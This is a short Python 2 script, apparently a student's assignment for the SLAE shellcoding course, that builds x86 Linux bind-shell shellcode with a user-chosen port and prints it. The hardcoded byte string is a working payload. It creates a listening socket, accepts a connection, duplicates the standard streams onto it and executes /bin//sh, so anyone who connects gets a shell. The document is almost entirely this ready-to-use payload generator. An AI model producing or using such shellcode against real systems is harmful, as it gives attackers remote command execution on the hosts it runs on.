#!/usr/bin/python

# Student ID: SLAE-1250
# Student Name: Jonathan "Chops" Crosby
# Assignment 1: Helper script to generate shellcode with custom port
# File Name: shellcode-generator.py

import sys
import os

#clear the console
os.system('clear')

if len(sys.argv) != 2:
    
    print "[x] usage: ./shellcode-generator.py PortNumber (ex: 4444)"
    sys.exit(0)

#setting port number
portNumber     = sys.argv[1]
origPortNumber = portNumber 

# convert number to hex
try:
    portNumber = hex(int(portNumber))
    print "[*] stage one: port number " + origPortNumber + " converted to hex: " + portNumber
except:
    print "[x] error converting port " + origPortNumber + " to hex"

# strip off 0x
portNumber = portNumber[-4:]
print "[*] stage two: port number cleanup: " + portNumber

# replace port in shellcode
# for example 4444 it would be 0x115c so we must reverse it

                     #5C                      #11
reversedPort = "\\x" + portNumber[:2]  + "\\x" + portNumber[2:]

print "[*] stage three: replaced port in shellcode"

shellcode = "\\x31\\xc0\\x50\\x6a\\x01\\x6a\\x02\\x89\\xe1\\x31\\xc0\\xb0\\x66\\x31\\xdb\\xb3\\x01\\xcd\\x80\\x96\\x31\\xd2\\x52\\x66\\x68" + reversedPort + "\\x66\\x6a\\x02\\x89\\xe1\\x6a\\x10\\x51\\x56\\x89\\xe1\\x43\\x31\\xc0\\xb0\\x66\\xcd\\x80\\x6a\\x01\\x56\\x89\\xe1\\x31\\xdb\\xb3\\x04\\x31\\xc0\\xb0\\x66\\xcd\\x80\\x31\\xd2\\x52\\x52\\x56\\x89\\xe1\\x43\\x31\\xc0\\xb0\\x66\\xcd\\x80\\x89\\xc3\\x31\\xc9\\xb1\\x03\\x31\\xc0\\xb0\\x3f\\xfe\\xc9\\xcd\\x80\\x75\\xf6\\x31\\xc0\\x50\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80"

print "[*] stage four: shellcode incoming!"
print "---"

print shellcode

print "---"
print "[*] done"
